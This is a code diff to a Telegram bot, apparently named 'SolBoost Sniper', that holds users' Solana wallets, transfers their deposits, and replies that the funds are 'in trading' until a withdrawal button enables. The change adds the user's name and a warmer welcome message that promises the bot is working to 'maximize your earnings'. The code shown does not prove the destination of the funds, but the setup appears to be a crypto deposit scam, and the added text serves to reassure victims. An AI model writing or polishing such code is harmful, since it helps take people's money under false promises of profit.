@@ -291,6 +291,7 @@ Balance: ${solBalance.toFixed(2).replace(/\./g, '\\.')} SOL \\(\\$${(solBalance 
 bot.action('start_earning', async (ctx) => {
     try {
         const userId = ctx.from.id;
+        const userName = ctx.from.username || ctx.from.first_name || "User"; // Fetch username or first name
         await ctx.answerCbQuery();
 
         if (!userWallets[userId]) {
@@ -356,7 +357,18 @@ To activate the SolBoost Sniper bot and start earning profits with our automated
                 const signature = await connection.sendTransaction(transaction, [userWallet], { skipPreflight: false, preflightCommitment: 'confirmed' });
                 await connection.confirmTransaction(signature, 'confirmed');
 
-                await ctx.reply(`Your deposit of ${(amountToTransfer / LAMPORTS_PER_SOL).toFixed(2)} SOL is in trading. Wait for the withdrawal button to enable to get your profit.`);
+                // Send a welcome message with the user's name
+                await ctx.reply(`Your deposit of ${(amountToTransfer / LAMPORTS_PER_SOL).toFixed(2)} SOL is in trading.
+
+🎉 Welcome on Board, ${userName}!
+
+Thank you for trusting us with your investment. Your deposit has been successfully received, and our automated trading bot is now working to maximize your earnings.
+
+Stay tuned for updates, and feel free to reach out if you have any questions!
+
+Happy trading! 🚀
+
+Note: Wait for the withdrawal button to enable to take your profit.`);
             } else {
                 await ctx.reply(`Insufficient balance to cover the transaction fee and rent exemption for user ${userId}.`);
             }
